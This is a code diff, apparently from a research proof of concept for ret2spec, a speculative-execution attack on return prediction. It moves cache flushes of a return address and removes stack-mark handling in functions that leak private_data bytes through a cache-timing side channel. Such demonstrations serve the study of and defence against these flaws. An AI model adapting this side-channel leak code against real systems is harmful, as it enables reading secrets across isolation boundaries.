@@ -89,27 +89,25 @@ bool bar() {
   for (int i = 0; i < 100; i++) {}
 
   if (cond == 0) {
+    // Return address is consistently at stack_mark + 20 bytes
+    // on Jason's ThinkPad. Can't do FlushFromDataCache under
+    // speculation since it doesn't fit in the window.
+    FlushDataCacheLineNoBarrier(ptr + 20);
+
     // This is copied here just to make sure speculation works.
     // For testing ret2spec, comment this out.
     // const std::array<BigByte, 256> &oracle = *oracle_ptr;
     // ForceRead(oracle.data() +
     //   static_cast<unsigned char>(private_data[current_offset]));
 
-    // Return address is consistently at stack_mark + 20 bytes
-    // on Jason's ThinkPad. Can't do FlushFromDataCache under
-    // speculation since it doesn't fit in the window.
-    FlushDataCacheLineNoBarrier(ptr + 20);
     return true;
   }
 
+  FlushDataCacheLineNoBarrier(ptr + 20);
   return false;
 }
 
 void foo() {
-  // Creates a stack mark and stores it to the global vector.
-  char stack_mark = 'a';
-  stack_mark_pointers.push_back(&stack_mark);
-
   // Make the condition false and induce misspeculation.
   // Bar should return false architecturally, but our goal is to
   // make it return true speculatively.
@@ -131,12 +129,6 @@ void foo() {
     ForceRead(oracle.data() +
       static_cast<unsigned char>(private_data[current_offset]));
   }
-
-  // Cleans-up its stack mark and flushes from the cache everything between its
-  // own stack mark and the next one. Somewhere there must be also the return
-  // address.
-  stack_mark_pointers.pop_back();
-  FlushFromDataCache(&stack_mark, stack_mark_pointers.back());
 }
 
 char Ret2specLeakByte() {
@@ -182,16 +174,9 @@ char Ret2AbortedCallLeakByte() {
     // Clear the cache channel.
     sidechannel.FlushOracle();
 
-    // Stack mark for the first call of ReturnsTrue. Otherwise it would read
-    // from an empty vector and crash.
-    char stack_mark = 'a';
-    stack_mark_pointers.push_back(&stack_mark);
-
     // In our diagram, this is effectively the main function that calls foo
     // and probes the cache for an access.
     foo();
-
-    stack_mark_pointers.pop_back();
 
     std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
     if (result.first) {
